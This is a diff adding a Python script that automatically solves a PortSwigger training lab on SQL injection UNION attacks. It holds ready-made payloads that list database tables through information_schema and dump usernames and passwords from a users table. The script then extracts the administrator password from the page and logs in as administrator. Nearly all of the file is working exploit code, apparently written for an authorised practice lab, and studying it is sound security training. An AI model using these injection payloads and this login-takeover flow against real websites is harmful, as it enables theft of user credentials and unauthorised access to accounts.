@@ -1,0 +1,75 @@
+# Lab name: Lab: SQL injection UNION attack, retrieving data from other tables
+# Lab link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
+
+import requests
+import os, sys
+from bs4 import BeautifulSoup
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+r = requests.Session()
+admin_username = 'administrator'
+password = ''
+poc_payload_for_users_table = "filter?category=Pets'union+SELECT+null,TABLE_NAME+FROM+information_schema.tables+where+TABLE_NAME+LIKE+'%25user%25'--"
+payload_to_get_users_with_passwords = "=Pets'union+SELECT+username,password+FROM+users--"
+
+url = input('Enter lab url: ')
+proxies = {
+    'http':'http://127.0.0.1:8080',
+    'https':'http://127.0.0.1:8080'
+}
+
+
+def filter_url():
+    global url
+    url = (url.split('.net', 1)[0]) + f'.net/{poc_payload_for_users_table}'
+        
+
+
+def get_administrator_password(response):
+    password = ((response.text.split('<th>administrator</th>')[1])
+           .split('</tr>',1)[0]).strip().replace('<td>','').replace('</td>','')
+    return password
+
+def get_csrf_token_from_response(url):
+    response = r.get(url, verify=False, proxies=proxies)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    csrf_token = soup.find('input')['value']
+    return csrf_token
+
+def login_as_administrator(username, password):
+    login_url = (url.split('.net', 1)[0]) + '.net/login'
+    csrf = get_csrf_token_from_response(login_url)
+    data = {
+        'csrf':csrf,
+        'username': username,
+        'password': password
+    }
+    response = r.post(url=login_url, data=data, proxies=proxies, verify=False)
+    if '/my-account?id=administrator' in response.text:
+        print(f'Lab solved successfully and username: {admin_username}, password: {password}', end='')
+    elif response.status_code == 504:
+        print(f'failed to login but username: {admin_username}, password: {password} try to login yourself', end='')
+    else:
+        print('Lab is not available, please refresh the url')
+    print()
+    exit(0)
+
+
+filter_url()
+
+response = r.get(url, proxies=proxies, verify=False)
+
+
+if 'users' in response.text:
+    url = url.split('=', 1)[0]
+    url += f"{payload_to_get_users_with_passwords}"
+    response = r.get(url, proxies=proxies, verify=False)
+    if admin_username in response.text:
+        password = get_administrator_password(response)
+        login_as_administrator(admin_username, password)
+            
+    print(f'Error failed to find {admin_username}')
+    exit(0)
+print(f'Error failed to find users table')
+
